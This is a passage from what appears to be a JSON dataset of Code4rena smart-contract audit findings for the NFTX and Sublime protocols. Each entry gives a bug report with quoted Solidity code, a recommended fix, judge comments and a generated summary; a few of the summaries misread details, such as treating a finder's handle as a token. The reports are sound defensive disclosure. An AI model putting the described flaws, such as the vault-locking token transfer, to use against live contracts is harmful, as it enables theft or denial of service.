      "content": "## Handle\n\nhyh\n\n\n## Vulnerability details\n\n## Impact\n\n`transferFromERC721(address assetAddr, uint256 tokenId, address to)` should transfer from `msg.sender` to `to`.\nIt transfers to `address(this)` instead when ERC721 is Cryptokitties.\nAs there is no additional logic for this case it seems to be a mistake that leads to wrong NFT accounting after such a transfer as NFT will be missed in the vault (which is `to`).\n\n## Proof of Concept\n\nNFTXStakingZap:\ntransferFromERC721\nhttps://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXStakingZap.sol#L416\n\nNFTXMarketplaceZap:\ntransferFromERC721\nhttps://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L556\n\nBoth functions are called by user facing Marketplace buy/sell and Staking addLiquidity/provideInventory functions.\n\n## Recommended Mitigation Steps\n\nFix the address:\n\nNow:\n```\n// Cryptokitties.\ndata = abi.encodeWithSignature(\"transferFrom(address,address,uint256)\", msg.sender, address(this), tokenId);\n```\n\nTo be:\n```\n// Cryptokitties.\ndata = abi.encodeWithSignature(\"transferFrom(address,address,uint256)\", msg.sender, to, tokenId);\n```",
      "summary": "\nThis bug report is about a vulnerability in the transferFromERC721 function which should transfer from msg.sender to to, but instead transfers to address(this) when the ERC721 is Cryptokitties. This leads to wrong NFT accounting as the NFT will be missed in the vault. The bug can be found in the NFTXStakingZap and NFTXMarketplaceZap functions, which are called by user facing Marketplace buy/sell and Staking addLiquidity/provideInventory functions. The recommended mitigation step is to fix the address by changing the code from \"transferFrom(address,address,uint256)\", msg.sender, address(this), tokenId to \"transferFrom(address,address,uint256)\", msg.sender, to, tokenId.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/185",
      "tags": [],
      "finders": [
        "hyh"
      ]
    },
    {
      "id": "1219",
      "title": "[M-03] NFTXMarketplaceZap.sol#buyAnd***() should return unused weth/eth back to msg.sender instead of to",
      "impact": "MEDIUM",
      "content": "## Handle\n\nWatchPug\n\n\n## Vulnerability details\n\nhttps://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L226-L249\n\n```solidity=226\nfunction buyAndSwap721WETH(\n    uint256 vaultId, \n    uint256[] memory idsIn, \n    uint256[] memory specificIds, \n    uint256 maxWethIn, \n    address[] calldata path,\n    address to\n  ) public nonReentrant {\n    require(to != address(0));\n    require(idsIn.length != 0);\n    IERC20Upgradeable(address(WETH)).transferFrom(msg.sender, address(this), maxWethIn);\n    INFTXVault vault = INFTXVault(nftxFactory.vault(vaultId));\n    uint256 redeemFees = (vault.targetSwapFee() * specificIds.length) + (\n        vault.randomSwapFee() * (idsIn.length - specificIds.length)\n    );\n    uint256[] memory amounts = _buyVaultToken(address(vault), redeemFees, maxWethIn, path);\n    _swap721(vaultId, idsIn, specificIds, to);\n\n    emit Swap(idsIn.length, amounts[0], to);\n\n    // Return extras.\n    uint256 remaining = WETH.balanceOf(address(this));\n    WETH.transfer(to, remaining);\n  }\n```\n\nFor example:\n\nIf Alice calls `buyAndSwap721WETH()` to buy some ERC721 and send to Bob, for slippage control, Alice put `1000 ETH` as `maxWethIn`, the actual cost should be lower.\n\nLet's say the actual cost is `900 ETH`.\n\nExpected Results: Alice spend only for the amount of the actual cost (`900 ETH`).\n\nActual Results: Alice spent `1000 ETH`.",
      "summary": "\nThis bug report is about an issue with the WatchPug code. It is related to the function buyAndSwap721WETH, which is used to buy ERC721 tokens and send them to another address. The bug is that when the user puts a maximum amount of ETH (e.g. 1000 ETH) as maxWethIn, the actual cost should be lower, but the user is still charged the full amount. This means that the user is spending more than they should be. This bug could be costing users money and needs to be fixed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/161",
      "tags": [],
      "finders": [
        "WatchPug"
      ]
    },
    {
      "id": "1218",
      "title": "[M-02] NFTXSimpleFeeDistributor#addReceiver: Failure to check for existing receiver",
      "impact": "MEDIUM",
      "content": "_Submitted by GreyArt_\n\nThe `addReceiver()` function fails to check if the `_receiver` already exists. This could lead to the same receiver being added multiple times, which results in erroneous fee distributions.\n\nThe receiver would receive more than expected (until the duplicate entry has been removed).\n\n#### Recommended Mitigation Steps\n\nHave a mapping `address => bool isReceiver` that will update whenever receivers are added, modified to a new address or removed.\n\n**[0xKiwi (NFTX) acknowledged, but disagreed with medium severity and commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/230#issuecomment-1003210641):**\n > Valid concern, but this is a permissioned function.\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/230#issuecomment-1064558228):**\n > I think this one is much more likely. I would suggest adding a check because the problem is easy to create and much harder to notice.\n\n\n\n***\n\n",
      "summary": "\nThis bug report discusses a vulnerability in the `addReceiver()` function that fails to check if the `_receiver` already exists. This could result in the same receiver being added multiple times, leading to erroneous fee distributions. The receiver would receive more than expected until the duplicate entry has been removed. The recommended mitigation step is to have a mapping `address => bool isReceiver` that will update whenever receivers are added, modified to a new address or removed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/230",
      "tags": [],
      "finders": [
        "GreyArt"
      ]
    },
    {
      "id": "1217",
      "title": "[M-01] Missing non reentrancy modifier",
      "impact": "MEDIUM",
      "content": "_Submitted by robee_\n\nThe following functions are missing reentrancy modifier although some other pulbic/external functions does use reentrancy modifer.\nEven though I did not find a way to exploit it, it seems like those functions should have the nonReentrant modifier as the other functions have it as well..\n\n```bash\n  NFTXMarketplaceZap.sol, receive is missing a reentrancy modifier\n  NFTXSimpleFeeDistributor.sol, __SimpleFeeDistributor__init__ is missing a reentrancy modifier\n  NFTXSimpleFeeDistributor.sol, addReceiver is missing a reentrancy modifier\n  NFTXSimpleFeeDistributor.sol, initializeVaultReceivers is missing a reentrancy modifier\n  NFTXSimpleFeeDistributor.sol, changeReceiverAlloc is missing a reentrancy modifier\n  NFTXSimpleFeeDistributor.sol, changeReceiverAddress is missing a reentrancy modifier\n  NFTXSimpleFeeDistributor.sol, removeReceiver is missing a reentrancy modifier\n  NFTXSimpleFeeDistributor.sol, setTreasuryAddress is missing a reentrancy modifier\n  NFTXSimpleFeeDistributor.sol, setLPStakingAddress is missing a reentrancy modifier\n  NFTXSimpleFeeDistributor.sol, setInventoryStakingAddress is missing a reentrancy modifier\n  NFTXSimpleFeeDistributor.sol, setNFTXVaultFactory is missing a reentrancy modifier\n  NFTXSimpleFeeDistributor.sol, pauseFeeDistribution is missing a reentrancy modifier\n  NFTXSimpleFeeDistributor.sol, rescueTokens is missing a reentrancy modifier\n  NFTXStakingZap.sol, setLPLockTime is missing a reentrancy modifier\n  NFTXStakingZap.sol, setInventoryLockTime is missing a reentrancy modifier\n  NFTXStakingZap.sol, provideInventory721 is missing a reentrancy modifier\n  NFTXStakingZap.sol, provideInventory1155 is missing a reentrancy modifier\n  NFTXStakingZap.sol, addLiquidity721ETH is missing a reentrancy modifier\n  NFTXStakingZap.sol, addLiquidity1155ETH is missing a reentrancy modifier\n  NFTXStakingZap.sol, addLiquidity721 is missing a reentrancy modifier\n  NFTXStakingZap.sol, addLiquidity1155 is missing a reentrancy modifier\n  NFTXStakingZap.sol, receive is missing a reentrancy modifier\n  NFTXStakingZap.sol, rescue is missing a reentrancy modifier\n  NFTXV1Buyout.sol, __NFTXV1Buyout_init is missing a reentrancy modifier\n  NFTXV1Buyout.sol, emergencyWithdraw is missing a reentrancy modifier\n  NFTXV1Buyout.sol, clearBuyout is missing a reentrancy modifier\n  NFTXV1Buyout.sol, addBuyout is missing a reentrancy modifier\n  NFTXV1Buyout.sol, removeBuyout is missing a reentrancy modifier\n  NFTXVaultUpgradeable.sol, __NFTXVault_init is missing a reentrancy modifier\n  NFTXVaultUpgradeable.sol, finalizeVault is missing a reentrancy modifier\n  NFTXVaultUpgradeable.sol, setVaultMetadata is missing a reentrancy modifier\n  NFTXVaultUpgradeable.sol, setVaultFeatures is missing a reentrancy modifier\n  NFTXVaultUpgradeable.sol, assignDefaultFeatures is missing a reentrancy modifier\n  NFTXVaultUpgradeable.sol, setFees is missing a reentrancy modifier\n  NFTXVaultUpgradeable.sol, disableVaultFees is missing a reentrancy modifier\n  NFTXVaultUpgradeable.sol, deployEligibilityStorage is missing a reentrancy modifier\n  NFTXVaultUpgradeable.sol, setManager is missing a reentrancy modifier\n  NFTXVaultUpgradeable.sol, mint is missing a reentrancy modifier\n  NFTXVaultUpgradeable.sol, redeem is missing a reentrancy modifier\n  NFTXVaultUpgradeable.sol, swap is missing a reentrancy modifier\n  NFTXVaultUpgradeable.sol, flashLoan is missing a reentrancy modifier\n  PalmNFTXStakingZap.sol, setLockTime is missing a reentrancy modifier\n  PalmNFTXStakingZap.sol, addLiquidity721 is missing a reentrancy modifier\n  PalmNFTXStakingZap.sol, addLiquidity1155 is missing a reentrancy modifier\n  PalmNFTXStakingZap.sol, receive is missing a reentrancy modifier\n```\n**[0xKiwi (NFTX) disputed](https://github.com/code-423n4/2021-12-nftx-findings/issues/37)**\n\n**[LSDan (judge) increased severity to medium and commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/37#issuecomment-1064587166):**\n > I'm updating this [from a low] to a medium. Reentrancy represents a real and significant risk (as evident by ETC existing) and should be protected against regardless of if you can foresee the external event that causes lack of protection to be an issue.\n> \n> `\n> 2 â€” Med (M): vulns have a risk of 2 and are considered â€œMediumâ€ severity when assets are not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n> `\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the missing reentrancy modifier in some functions in NFTXMarketplaceZap.sol, NFTXSimpleFeeDistributor.sol, NFTXStakingZap.sol, NFTXV1Buyout.sol, NFTXVaultUpgradeable.sol, and PalmNFTXStakingZap.sol. Reentrancy modifier is a security measure used to prevent malicious actors from taking advantage of the functions. In this report, it is mentioned that even though no exploit was found, the functions should still have the nonReentrant modifier as the other functions have it as well. A total of 30 functions are mentioned in the report as missing the reentrancy modifier.",
      "quality_score": 1,
      "rarity_score": 1,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/37",
      "tags": [
        "Reentrancy"
      ],
      "finders": [
        "robee"
      ]
    },
    {
      "id": "1216",
      "title": "[H-03] A vault can be locked from MarketplaceZap and StakingZap",
      "impact": "HIGH",
      "content": "_Submitted by p4st13r4, also found by cmichel, GreyArt, hyh, jayjonah8, leastwood, pauliax, shenwilly, and WatchPug_\n\nAny user that owns a vToken of a particular vault can lock the functionalities of `NFTXMarketplaceZap.sol` and `NFTXStakingZap.sol` for everyone.\n\nEvery operation performed by the marketplace, that deals with vToken minting, performs this check:\n\n```jsx\nrequire(balance == IERC20Upgradeable(vault).balanceOf(address(this)), \"Did not receive expected balance\");\n```\n\nA malicious user could transfer any amount > 0 of a vaultâ€™vToken to the marketplace (or staking) zap contracts, thus making the vault functionality unavailable for every user on the marketplace\n\n#### Proof of Concept\n\n<https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L421>\n\n<https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L421>\n\n#### Recommended Mitigation Steps\n\nRemove this logic from the marketplace and staking zap contracts, and add it to the vaults (if necessary)\n\n**[0xKiwi (NFTX) confirmed, but disagreed with high severity and commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/107#issuecomment-1003193410):**\n > Valid concern, confirmed. And disagreeing with severity.\n\n**[0xKiwi (NFTX) resolved](https://github.com/code-423n4/2021-12-nftx-findings/issues/107)**\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/107#issuecomment-1064511914):**\n > In this case I agree with the warden's severity. The attack would cause user funds to be locked and is incredibly easy to perform.\n\n\n\n***\n\n \n",
      "summary": "\nThis bug report is about a vulnerability in the NFTXMarketplaceZap.sol and NFTXStakingZap.sol contracts. Any user that owns a vToken of a particular vault can lock the functionalities of these contracts for everyone. This is because of a check that is performed by the marketplace when dealing with vToken minting. A malicious user could transfer any amount > 0 of a vaultâ€™vToken to the marketplace (or staking) zap contracts, thus making the vault functionality unavailable for every user on the marketplace. The proof of concept can be found at two Github links. To mitigate this vulnerability, the logic should be removed from the marketplace and staking zap contracts, and added to the vaults if necessary.",
      "quality_score": 3,
      "rarity_score": 2,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/107",
      "tags": [
        "Wrong Math"
      ],
      "finders": [
        "GreyArt",
        "pauliax",
        "cmichel",
        "leastwood",
        "WatchPug",
        "shenwilly",
        "jayjonah8",
        "hyh",
        "p4st13r4"
      ]
    },
    {
      "id": "1215",
      "title": "[H-02] The return value of the _sendForReceiver function is not set, causing the receiver to receive more fees",
      "impact": "HIGH",
      "content": "_Submitted by cccz, also found by WatchPug_\n\nIn the NFTXSimpleFeeDistributor.sol contract, the distribute function is used to distribute the fee, and the distribute function judges whether the fee is sent successfully according to the return value of the \\_sendForReceiver function.\n\n```solidity\nfunction distribute(uint256 vaultId) external override virtual nonReentrant {\n  require(nftxVaultFactory != address(0));\n  address _vault = INFTXVaultFactory(nftxVaultFactory).vault(vaultId);\n\n  uint256 tokenBalance = IERC20Upgradeable(_vault).balanceOf(address(this));\n\n  if (distributionPaused || allocTotal == 0) {\n    IERC20Upgradeable(_vault).safeTransfer(treasury, tokenBalance);\n    return;\n  }\n\n  uint256 length = feeReceivers.length;\n  uint256 leftover;\n  for (uint256 i = 0; i <length; i++) {\n    FeeReceiver memory _feeReceiver = feeReceivers[i];\n    uint256 amountToSend = leftover + ((tokenBalance * _feeReceiver.allocPoint) / allocTotal);\n    uint256 currentTokenBalance = IERC20Upgradeable(_vault).balanceOf(address(this));\n    amountToSend = amountToSend> currentTokenBalance? currentTokenBalance: amountToSend;\n    bool complete = _sendForReceiver(_feeReceiver, vaultId, _vault, amountToSend);\n    if (!complete) {\n      leftover = amountToSend;\n    } else {\n      leftover = 0;\n    }\n  }\n```\n\nIn the \\_sendForReceiver function, when \\_receiver is not a contract, no value is returned. By default, this will return false. This will make the distribute function think that the fee sending has failed, and will send more fees next time.\n```solidity\nfunction _sendForReceiver(FeeReceiver memory _receiver, uint256 _vaultId, address _vault, uint256 amountToSend) internal virtual returns (bool) {\n  if (_receiver.isContract) {\n    IERC20Upgradeable(_vault).approve(_receiver.receiver, amountToSend);\n    // If the receive is not properly processed, send it to the treasury instead.\n      \n    bytes memory payload = abi.encodeWithSelector(INFTXLPStaking.receiveRewards.selector, _vaultId, amountToSend);\n    (bool success,) = address(_receiver.receiver).call(payload);\n\n    // If the allowance has not been spent, it means we can pass it forward to next.\n    return success && IERC20Upgradeable(_vault).allowance(address(this), _receiver.receiver) == 0;\n  } else {\n    IERC20Upgradeable(_vault).safeTransfer(_receiver.receiver, amountToSend);\n  }\n}\n```\n#### Proof of Concept\n\n<https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L157-L168>\n\n<https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L49-L67>\n\n#### Recommended Mitigation Steps\n```solidity\nfunction _sendForReceiver(FeeReceiver memory _receiver, uint256 _vaultId, address _vault, uint256 amountToSend) internal virtual returns (bool) {\n  if (_receiver.isContract) {\n    IERC20Upgradeable(_vault).approve(_receiver.receiver, amountToSend);\n    // If the receive is not properly processed, send it to the treasury instead.\n      \n    bytes memory payload = abi.encodeWithSelector(INFTXLPStaking.receiveRewards.selector, _vaultId, amountToSend);\n    (bool success, ) = address(_receiver.receiver).call(payload);\n\n    // If the allowance has not been spent, it means we can pass it forward to next.\n    return success && IERC20Upgradeable(_vault).allowance(address(this), _receiver.receiver) == 0;\n  } else {\n    - IERC20Upgradeable(_vault).safeTransfer(_receiver.receiver, amountToSend);\n    + return IERC20Upgradeable(_vault).safeTransfer(_receiver.receiver, amountToSend);\n  }\n}\n```\n**[0xKiwi (NFTX) confirmed, but disagreed with high severity and commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/67#issuecomment-1003192355):**\n > Good catch, thank you. Disagreeing with severity though since this is a permissioned contract, no user funds are at risk and this would most likely cause some failures.\n> \n> We aren't using any EOAs as receivers in production or testing, so this has not been caught. Thank you.\n\n**[0xKiwi (NFTX) resolved](https://github.com/code-423n4/2021-12-nftx-findings/issues/67)**\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/67#issuecomment-1064471042):**\n > I agree with the warden on this one. Funds are directly at risk and the likelihood of this occurring is 100%. I'm not sure if it matters if the funds are user funds or protocol funds. This would eventually have become a big problem that affected the protocol's ability to function.\n\n\n\n***\n\n",
      "summary": "\nA bug report has been filed for the NFTXSimpleFeeDistributor.sol contract. This contract has a distribute function, which is used to distribute the fee. The distribute function judges whether the fee is sent successfully based on the return value of the _sendForReceiver function. However, when the recipient of the fee is not a contract, no value is returned. As a result, the distribute function will think the fee sending has failed and keep sending more fees.\n\nThe bug can be seen at the following links:\n\nhttps://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L157-L168\n\nhttps://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L49-L67\n\nThe bug was found through manual analysis. The recommended mitigation step is to modify the _sendForReceiver function to return a value if the recipient is not a contract. The modified code is given above.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/67",
      "tags": [],
      "finders": [
        "cccz",
        "WatchPug"
      ]
    },
    {
      "id": "1214",
      "title": "[H-01] buyAndSwap1155WETH() function may cause loss of user assets",
      "impact": "HIGH",
      "content": "_Submitted by cccz_\n\nIn the NFTXMarketplaceZap.sol contract, the buyAndSwap1155WETH function uses the WETH provided by the user to exchange VaultToken, but when executing the \\_buyVaultToken method, msg.value is used instead of maxWethIn. Since msg.value is 0, the call will fail.\n```solidity\nfunction buyAndSwap1155WETH(\n  uint256 vaultId,\n  uint256[] memory idsIn,\n  uint256[] memory amounts,\n  uint256[] memory specificIds,\n  uint256 maxWethIn,\n  address[] calldata path,\n  address to\n) public payable nonReentrant {\n  require(to != address(0));\n  require(idsIn.length != 0);\n  IERC20Upgradeable(address(WETH)).transferFrom(msg.sender, address(this), maxWethIn);\n  uint256 count;\n  for (uint256 i = 0; i <idsIn.length; i++) {\n      uint256 amount = amounts[i];\n      require(amount> 0, \"Transferring <1\");\n      count += amount;\n  }\n  INFTXVault vault = INFTXVault(nftxFactory.vault(vaultId));\n  uint256 redeemFees = (vault.targetSwapFee() * specificIds.length) + (\n      vault.randomSwapFee() * (count-specificIds.length)\n  );\n  uint256[] memory swapAmounts = _buyVaultToken(address(vault), redeemFees, msg.value, path);\n```\n\nIn extreme cases, when the user provides both ETH and WETH (the user approves the contract WETH in advance and calls the buyAndSwap1155WETH function instead of the buyAndSwap1155 function by mistake), the \\_buyVaultToken function will execute successfully, but because the buyAndSwap1155WETH function will not convert ETH to WETH, The userâ€™s ETH will be locked in the contract, causing loss of user assets.\n```solidity\nfunction _buyVaultToken(\n  address vault,\n  uint256 minTokenOut,\n  uint256 maxWethIn,\n  address[] calldata path\n) internal returns (uint256[] memory) {\n  uint256[] memory amounts = sushiRouter.swapTokensForExactTokens(\n    minTokenOut,\n    maxWethIn,\n    path,\n    address(this),\n    block.timestamp\n  );\n\n  return amounts;\n}\n```\n\n#### Recommended Mitigation Steps\n```solidity\n  - uint256[] memory swapAmounts = _buyVaultToken(address(vault), redeemFees, msg.value, path);\n  + uint256[] memory swapAmounts = _buyVaultToken(address(vault), redeemFees, maxWethIn, path);\n```\n\n**[0xKiwi (NFTX) confirmed and resolved](https://github.com/code-423n4/2021-12-nftx-findings/issues/2)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability found in the NFTXMarketplaceZap.sol contract. The buyAndSwap1155WETH function uses the WETH provided by the user to exchange VaultToken, but when executing the _buyVaultToken method, msg.value is used instead of maxWethIn. Since msg.value is 0, the call will fail, leading to the user's ETH being locked in the contract. This was discovered through a manual audit. The recommended mitigation step is to change the code from uint256[] memory swapAmounts = _buyVaultToken(address(vault), redeemFees, msg.value, path); to uint256[] memory swapAmounts = _buyVaultToken(address(vault), redeemFees, maxWethIn, path);.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/2",
      "tags": [],
      "finders": [
        "cccz"
      ]
    },
    {
      "id": "1202",
      "title": "[M-08] Missing approve(0)",
      "impact": "MEDIUM",
      "content": "_Submitted by sirhashalot, also found by Jujic, and sirhashalot_\n\n#### Impact\n\nThere are 3 instances where the `IERC20.approve()` function is called only once without setting the allowance to zero. Some tokens, like USDT, require first reducing the address' allowance to zero by calling `approve(_spender, 0)`. Transactions will revert when using an unsupported token like USDT (see the `approve()` function requirement [at line 199](https://etherscan.io/address/0xdac17f958d2ee523a2206206994597c13d831ec7#code)).\n\n#### Proof of Concept\n\n*   [CreditLine/CreditLine.sol:647](https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/CreditLine/CreditLine.sol#L647)\n*   [CreditLine/CreditLine.sol:779](https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/CreditLine/CreditLine.sol#L779)\n*   [yield/AaveYield.sol:324](https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/yield/AaveYield.sol#L324)\n\nNote: the usage of `approve()` in yield/CompoundYield.sol ([lines 211-212](https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/yield/CompoundYield.sol#L211-L212)), in yield/YearnYield.sol ([lines 211-212](https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/yield/YearnYield.sol#L210-L211)), and in yield/AaveYield.sol ([lines 297-298](https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/yield/AaveYield.sol#L297-L298)) do not need modification since it they already use the recommended approach. Additionally the usage of `approve()` in [yield/AaveYield.sol:307](https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/yield/AaveYield.sol#L307) likely does not need modification since that approve function only handles ETH.\n\n#### Recommended Mitigation Steps\n\nUse `approve(_spender, 0)` to set the allowance to zero immediately before each of the existing `approve()` calls.\n\n**[ritik99 (Sublime) confirmed](https://github.com/code-423n4/2021-12-sublime-findings/issues/97)**\n**[0xean (judge) commented](https://github.com/code-423n4/2021-12-sublime-findings/issues/97#issuecomment-1018865958):**\n > moving to medium risk as the availability of the protocol is affected. \n> \n> `\n> 2 â€” Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n> `\n\n",
      "summary": "\nThis bug report concerns the `IERC20.approve()` function in the code for CreditLine, YearnYield, and AaveYield. It is used to allow an address to spend a certain amount of tokens, but some tokens like USDT require the allowance to be set to zero before each call. There are 3 instances in the code where the `approve()` function is called only once without setting the allowance to zero. This could cause transactions to revert when using an unsupported token like USDT. Manual analysis was used to identify the issue. To resolve the issue, the recommended mitigation step is to use `approve(_spender, 0)` to set the allowance to zero immediately before each of the existing `approve()` calls.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sublime",
      "source_link": "https://code4rena.com/reports/2021-12-sublime",
      "github_link": "https://github.com/code-423n4/2021-12-sublime-findings/issues/97",
      "tags": [],
      "finders": [
        "sirhashalot",
        "Jujic"
      ]
    },
    {
      "id": "1201",
      "title": "[M-07] AaveYield: Misspelled external function name making functions fail",
      "impact": "MEDIUM",
      "content": "_Submitted by 0xngndev_\n\n#### Impact\n\nIn `AaveYield.sol` the functions:\n\n*   `liquidityToken`\n*   `_withdrawETH`\n*   `_depositETH`\n\nMake a conditional call to `IWETHGateway(wethGateway).getAWETHAddress()`\n\nThis function does not exist in the `wethGateway` contract, causing these function to fail with the error `\"Fallback not allowed\"`.\n\nThe function they should be calling is `getWethAddress()` without the \"A\".\n\nSmall yet dangerous typo.\n\n##### Mitigation Steps\n\nSimply modify:\n\n`IWETHGateway(wethGateway).getAWETHAddress()`\n\nto:\n\n`IWETHGateway(wethGateway).getWETHAddress()`\n\nIn the functions mentioned above.\n\n**[ritik99 (Sublime) confirmed](https://github.com/code-423n4/2021-12-sublime-findings/issues/42#issuecomment-1001348407):**\n > We were using an older version of the contracts that had [this definition](https://etherscan.io/address/dcd33426ba191383f1c9b431a342498fdac73488#code#F1#L158), will be updated accordingly\n\n\n",
      "summary": "\nThis bug report is related to the AaveYield.sol contract. The functions liquidityToken, _withdrawETH and _depositETH make a conditional call to the IWETHGateway(wethGateway).getAWETHAddress() function, which doesn't exist in the wethGateway contract, causing these functions to fail with the error \"Fallback not allowed\". This is due to a small typo, as the function they should be calling is getWethAddress() without the \"A\". To mitigate this issue, the code should be modified to call IWETHGateway(wethGateway).getWETHAddress() in the mentioned functions.",
      "quality_score": 5,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sublime",
      "source_link": "https://code4rena.com/reports/2021-12-sublime",
      "github_link": "https://github.com/code-423n4/2021-12-sublime-findings/issues/42",
      "tags": [
        "Typo / CopyPaste"
      ],
      "finders": [
        "0xngndev"
      ]
    },
    {
      "id": "1200",
      "title": "[M-06] `NoYield.sol` Tokens with fee on transfer are not supported",
      "impact": "MEDIUM",
      "content": "_Submitted by WatchPug_\n\n\nThere are ERC20 tokens that charge fee for every `transfer()` or `transferFrom()`.\n\nIn the current implementation, `NoYield.sol#lockTokens()` assumes that the received amount is the same as the transfer amount, and uses it to calculate `sharesReceived` amounts.\n\nAs a result, in `unlockTokens()`, later users may not be able to successfully withdraw their tokens, as it may revert at L141 for insufficient balance.\n\n<https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/yield/NoYield.sol#L93-L106>\n\n```solidity\nfunction lockTokens(\n    address user,\n    address asset,\n    uint256 amount\n) external payable override onlySavingsAccount nonReentrant returns (uint256 sharesReceived) {\n    require(amount != 0, 'Invest: amount');\n    if (asset != address(0)) {\n        IERC20(asset).safeTransferFrom(user, address(this), amount);\n    } else {\n        require(msg.value == amount, 'Invest: ETH amount');\n    }\n    sharesReceived = amount;\n    emit LockedTokens(user, asset, sharesReceived);\n}\n```\n\n<https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/yield/NoYield.sol#L134-L144>\n\n```solidity\nfunction _unlockTokens(address asset, uint256 amount) internal returns (uint256 received) {\n    require(amount != 0, 'Invest: amount');\n    received = amount;\n    if (asset == address(0)) {\n        (bool success, ) = savingsAccount.call{value: received}('');\n        require(success, 'Transfer failed');\n    } else {\n        IERC20(asset).safeTransfer(savingsAccount, received);\n    }\n    emit UnlockedTokens(asset, received);\n}\n```\n\n##### Recommendation\n\nConsider comparing before and after balance to get the actual transferred amount.\n\n**[ritik99 (Sublime) acknowledged and disagreed with severity](https://github.com/code-423n4/2021-12-sublime-findings/issues/142)**\n\n\n",
      "summary": "\nThis bug report concerns the WatchPug ERC20 tokens, which charge a fee for every `transfer()` or `transferFrom()` call. The current implementation of `NoYield.sol#lockTokens()` assumes that the received amount is the same as the transfer amount, and uses it to calculate `sharesReceived` amounts. This can cause an issue in `unlockTokens()`, where later users may not be able to successfully withdraw their tokens, as it may revert at L141 for insufficient balance. To fix this, the code should compare the before and after balance to get the actual transferred amount.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sublime",
      "source_link": "https://code4rena.com/reports/2021-12-sublime",
      "github_link": "https://github.com/code-423n4/2021-12-sublime-findings/issues/142",
      "tags": [
        "Fee On Transfer"
      ],
      "finders": [
        "WatchPug"
      ]
    },
    {
      "id": "1199",
      "title": "[M-05] Extension voting threshold check needs to rerun on each transfer",
      "impact": "MEDIUM",
